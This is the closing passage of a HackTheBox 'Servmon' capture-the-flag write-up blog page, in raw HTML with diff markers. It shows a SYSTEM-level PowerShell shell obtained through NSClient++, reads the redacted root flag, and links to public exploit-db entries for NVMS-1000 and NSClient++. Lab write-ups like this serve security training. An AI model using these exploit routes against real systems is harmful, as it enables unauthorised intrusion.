+</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="kr">Try</span><span class="w"> </span><span class="nf">the</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">cross-platform</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">https://aka.ms/pscore6</span><span class="w">
+
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\NSClient</span><span class="o">++</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\NSClient</span><span class="o">++</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="nf">whoami</span><span class="w">
+</span><span class="nx">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\NSClient</span><span class="o">++</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="nf">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="mi">64</span><span class="nf">e1-------------------------f274</span><span class="w">
+</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><p>And we pwned it …….</p><h1 id="donations">Donations</h1><p><strong>If u like My Content.Support a Poor Student who is collecting money to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></strong></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>NVMS-1000 exploit<td><a href="https://www.exploit-db.com/exploits/47774" target="_blank">NVMS-1000</a><tr><td>Nsclient++ Exploit<td><a href="https://www.exploit-db.com/exploits/46802" target="_blank">Nsclient++ exploit</a><tr><td>Nsclient api<td><a href="https://docs.nsclient.org/api/scripts/" target="_blank">Nsclient++ Api</a><tr><td>Nsclient++ Queries<td><a href="https://docs.nsclient.org/api/rest/queries/#command-execute" target="_blank">Queries api</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/nvms-1000/" class="post-tag no-text-decoration" >nvms-1000</a> <a href="/tags/nsclient%2B%2B/" class="post-tag no-text-decoration" >nsclient++</a> <a href="/tags/winpeas.exe/" class="post-tag no-text-decoration" >winPEAS.exe</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Servmon writeup - 0xPrashant&url=http://localhost:4000/posts/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Servmon writeup - 0xPrashant&u=http://localhost:4000/posts/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Servmon writeup - 0xPrashant&url=http://localhost:4000/posts/htb-servmon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-sneakymailer/"><div class="card-body"> <span class="timeago small" > Jul 15 <i class="unloaded">2020-07-15T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Sneakymailer writeup</h3><div class="text-muted small"><p> Introduction@sneakymailer:~$ Column Details Name Sneakymailer IP 10.10.10.197 Points 30 ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-akerva/"><div class="card-body"> <span class="timeago small" > Jun 12 <i class="unloaded">2020-06-12T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Fortress Akerva writeup</h3><div class="text-muted small"><p> Introduction@Akerva:~$ Column Details Name Akerva IP 10.13.37.11 Category Fortress Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-buff/"><div class="card-body"> <span class="timeago small" > Jul 29 <i class="unloaded">2020-07-29T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Buff writeup</h3><div class="text-muted small"><p> Introduction@Buff:~$ Column Details Name Buff IP 10.10.10.198 Points 20 Os Window...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-forwardslash/" class="btn btn-outline-primary"><p>Hackthebox Forwardslash writeup</p></a> <a href="/posts/htb-magic/" class="btn btn-outline-primary"><p>Hackthebox Magic writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-servmon/'; this.page.identifier = '/posts/htb-servmon/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
